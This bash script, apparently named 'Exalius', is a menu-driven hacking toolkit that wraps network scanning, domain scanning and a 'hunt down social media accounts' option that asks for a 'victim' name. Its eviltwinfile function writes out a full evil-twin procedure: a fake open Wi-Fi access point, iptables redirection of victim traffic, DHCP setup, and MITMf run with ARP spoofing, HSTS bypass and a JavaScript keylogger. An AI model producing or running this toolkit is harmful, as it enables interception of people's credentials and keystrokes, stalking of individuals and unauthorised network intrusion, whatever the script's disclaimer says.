#!/usr/bin/bash

function menu () {
clear
cat<<EOF
====================================================
███████╗██╗░░██╗░█████╗░██╗░░░░░██╗██╗░░░██╗░██████╗
██╔════╝╚██╗██╔╝██╔══██╗██║░░░░░██║██║░░░██║██╔════╝
█████╗░░░╚███╔╝░███████║██║░░░░░██║██║░░░██║╚█████╗░
██╔══╝░░░██╔██╗░██╔══██║██║░░░░░██║██║░░░██║░╚═══██╗
███████╗██╔╝╚██╗██║░░██║███████╗██║╚██████╔╝██████╔╝
╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░╚═════╝░╚═════╝░
====================================================
[+] Tool created by Erik Dzibela
[!] - erikdzibela1211@gmail.com
[!] I am not responsible for any inappropriate use of
    this tool.
====================================================
	$(tput setaf 33)[!] Current options....$(tput sgr 0)

	$(tput setaf 33)[1]$(tput sgr 0) - Network Tools
        $(tput setaf 33)[2]$(tput sgr 0) - Domain Scan
        $(tput setaf 33)[3]$(tput sgr 0) - Scan for network devices (Nmap scan)
	$(tput setaf 33)[4]$(tput sgr 0) - Hunt down social media accounts
	$(tput setaf 33)[5]$(tput sgr 0) - Scan for network devices (ARP scan - better)
	$(tput setaf 33)[6]$(tput sgr 0) - Enumeration scan (All ports) UDP & TCP 
	$(tput setaf 33)[7]$(tput sgr 0) - Exit
        ------------------
EOF
	read -p "[!] - Your option: "
        case "$REPLY" in
        "1") echo """
	I am not responsible for any inappropriate use of this tool.
	This tool was purely created for educational purposes for
	penetration testing. Beyond this point,
	anything that is done to a network you do not have permission
	to test is ILLEGAL.
	"""
	pressenter ;;
        "2") domainmenu ;;
	"3") read -p "[+] Please specify your host IP: " Ip
	echo """
	[-] This scan will view most if not all devices
	    actively connected to your network.
	"""
	sleep 2
	export IP=$Ip
	nmap -sn $IP/24
	pressenter1
	;;
	"4") echo """
	[!] This option uses sherlock to scan many different
	social media accounts by your chosen username.
	[!] To ensure that the tool works correctly, when specifying the
	victim name ensure all words are joined,
	e.g. John Doe = johndoe
	"""
	sleep 1
	read -p "[-] Enter the victims full name: " sherlock
	echo "[-] This scan can take between 1min to 10min..."
	sleep 1
	echo "[+] Scanning..."
	sleep 2
	sherlock $sherlock
	;;
	"5")
	read -p "[!] Enter your host IP: " ip1
	sleep 1
	echo "$(tput setaf 3)[+] Selected IP is $ip1.$(tput sgr 0)"
	echo
	read -p "$(tput setaf 3)[!] Would you like to save the file?[y.n]: $(tput sgr 0)" filesave
	if [[ $filesave == "y" || $filesave == "Y" ]]; then
	read -p "[+] Path and name for file [e.g. /root/filename]: " pathfile1
	export IP=$ip1
	sleep 1
	arp-scan $IP/24
	echo "$(tput setaf 1)[+] Saving file...$(tput sgr 0)"
	arp-scan $IP/24 > $pathfile1
	echo "$(tput setaf 3)[+] File was saved in $pathfile1.$(tput sgr 0)"
	pressenter1
	elif [[ $filesave == "n" || $filesave == "N" ]]; then
	echo "[+] Scanning..."
	sleep 2
	export IP=$ip1
	arp-scan $IP/24
	echo "$(tput setaf 1)[+] Scan complete.$(tput sgr 0)"
	sleep 1
	pressenter1
	fi
	;;
	"6") ;;
        esac
}

function eviltwin () {
clear
cat<<EVIL
=================================================================
███████╗██╗░░░██╗██╗██╗░░░░░  ████████╗░██╗░░░░░░░██╗██╗███╗░░██╗
██╔════╝██║░░░██║██║██║░░░░░  ╚══██╔══╝░██║░░██╗░░██║██║████╗░██║
█████╗░░╚██╗░██╔╝██║██║░░░░░  ░░░██║░░░░╚██╗████╗██╔╝██║██╔██╗██║
██╔══╝░░░╚████╔╝░██║██║░░░░░  ░░░██║░░░░░████╔═████║░██║██║╚████║
███████╗░░╚██╔╝░░██║███████╗  ░░░██║░░░░░╚██╔╝░╚██╔╝░██║██║░╚███║
╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝
=================================================================

	[1] - Network Scan
	[2] - Copy of full Evil Twin manual guide.
	[3] - Ifconfig
	[4] - Back

EVIL

	read -p "[!] - Your option: "
	case "$REPLY" in
	"1") read -p "[!] Please enter the interface you wish to use: " twin
	echo "$(tput setaf 1)[!] To close the upcoming terminal window press [CTRL+C]$(tput sgr 0)"
	sleep 3
	netscan
	pressenter
	 ;;
	"2") echo """
	This option is only for those who are skilled enough
	and have more indepth knowledge of hacking.
	"""
	read -p "[!] Where would you like us to save the file?[e.g /root/Desktop/nameoffile]: " twinfile
	sleep 1
	eviltwinfile
	echo "[+] File saved... "
	pressenter
	;;
	"3")
	ifconfig
	sleep 1
	pressenter ;;
	"4") menu ;;
	esac


}

function domainmenu () {
clear
cat<<DOMAIN
===========================================================================================================
██████╗░░█████╗░███╗░░░███╗░█████╗░██╗███╗░░██╗  ░██████╗░█████╗░░█████╗░███╗░░██╗███╗░░██╗███████╗██████╗░
██╔══██╗██╔══██╗████╗░████║██╔══██╗██║████╗░██║  ██╔════╝██╔══██╗██╔══██╗████╗░██║████╗░██║██╔════╝██╔══██╗
██║░░██║██║░░██║██╔████╔██║███████║██║██╔██╗██║  ╚█████╗░██║░░╚═╝███████║██╔██╗██║██╔██╗██║█████╗░░██████╔╝
██║░░██║██║░░██║██║╚██╔╝██║██╔══██║██║██║╚████║  ░╚═══██╗██║░░██╗██╔══██║██║╚████║██║╚████║██╔══╝░░██╔══██╗
██████╔╝╚█████╔╝██║░╚═╝░██║██║░░██║██║██║░╚███║  ██████╔╝╚█████╔╝██║░░██║██║░╚███║██║░╚███║███████╗██║░░██║
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
===========================================================================================================
	[!] Current Options...

	[1] - Slow full domain scan (most effective)
	[2] - Find a domain IP (finds IP of specified URL)
	[3] - Back

DOMAIN
	read -p "[!] Your option: "
	case "$REPLY" in
	"1") read -p "[+] URL of website: " url
	sleep 1
	echo
	echo "[!] This scan can take up to 30min, be patient..."
	sleep 3
	uniscan -u $url -qweds
	pressenter1 ;;
	"2") read -p "[+] URL of website: " url1
	sleep 1
	echo
	echo "[!] This scan should not take too long..."
	sleep 3
	uniscan -u $url1
	pressenter1
	 ;;
	"3") menu ;;
	esac


}

function pressenter () {
read -n1 -r -p "$(tput setaf 3)[-] Press enter to continue...$(tput sgr 0)" key
if [[ -z "$key" ]]; then
eviltwin
fi
}

function pressenter1 () {
read -n1 -r -p "$(tput setaf 3)[-] Press enter to continue...$(tput sgr 0)" key1
if [[ -z "$key" ]]; then
menu
fi
}

function monmode () {
if [[ $twin == "wlan0" ]]; then
airmon-ng start wlan0
elif [[ $twin == "wlan1" ]]; then
airmon-ng start wlan1
fi
}

function airodump () {
if [[ $twin == "wlan0" ]]; then
gnome-terminal -- airodump-ng wlan0mon
elif [[ $twin == "wlan1" ]]; then
airodump-ng wlan1mon
fi
}



function wlan0 () {
	airmon-ng start wlan0
}

function wlan1 () {
	airmon-ng start wlan1
}

function wlan2 () {
	airmon-ng start wlan2
}


function option3 () {
	exit 0
}

function netscan () {
airmon-ng start $twin
sleep 1
echo """
[+] Interface has been started...
[+] Running airodump-ng...
"""
if [[ $twin == "wlan0" ]]; then
xterm -e "airodump-ng wlan0mon"
elif [[ $twin == "wlan1" ]]; then
exterm -e "airodump-ng wlan1mon"
pressenter
fi
}





function eviltwinfile () {
echo """
route -n
//apt-get install dhcp3-server
apt-get install isc-dhcp-server
leafpad /etc/dhcp/dhcpd.conf
 
//
INTERFACES="at0";
 
subnet 192.168.2.0 netmask 255.255.255.0 {
option routers 192.168.2.1;
option subnet-mask 255.255.255.0;
option domain-name "openwifi";
option domain-name-servers 1.1.1.1,1.0.0.1;
range 192.168.2.100 192.168.2.125;
}
//
 
airmon-ng
airmon-ng check kill
airmon-ng start wlan0
//Creating the WiFi
airbase-ng -c 11 -e openwifi wlan0mon
 
ifconfig at0 up
 
//Creating New Interface "at0"
ifconfig at0 192.168.2.1 netmask 255.255.255.0
 
//MTU allow balanced / large packet data to flow
ifconfig at0 mtu 1400
 
//Adds Routing Table
route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
 
//Clears any existing iptables entries.
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
 
//echo - Forwarding Traffic thru our Fake AP and Your Internet source. (at0 <- -> victim device)
echo 1 > /proc/sys/net/ipv4/ip_forward
 
iptables -t nat -A PREROUTING -p udp -j DNAT --to 10.0.0.1 
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
//Starting DHCP Server - Automatically Assigning an IP Address on connection.
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
 
/etc/init.d/isc-dhcp-server start
service isc-dhcp-server start
 
//Installing MITMf
 
apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
 
git clone https://github.com/byt3bl33d3r/MITMf.git
cd MITMf && git submodule init && git submodule update --recursive
cd MITMf
pip install -r requirements.txt
 
python mitmf.py -i at0 --spoof --arp --gateway 192.168.2.1 --jskeylogger --hsts
""" > $twinfile
}



echo """ 
Thank you for choosing Exalius.
If you experience any issues please let us know.

This tool is still under construction and everything is subject to change.
"""
read -p "Welcome to Exalius, what should we call you?: " name
if [[ -z "$name" ]]; then
echo "No name? Okay then."
else
echo """Nice to meet you $name.
[+] Exalius is preparing...
"""
sleep 2
fi
menu



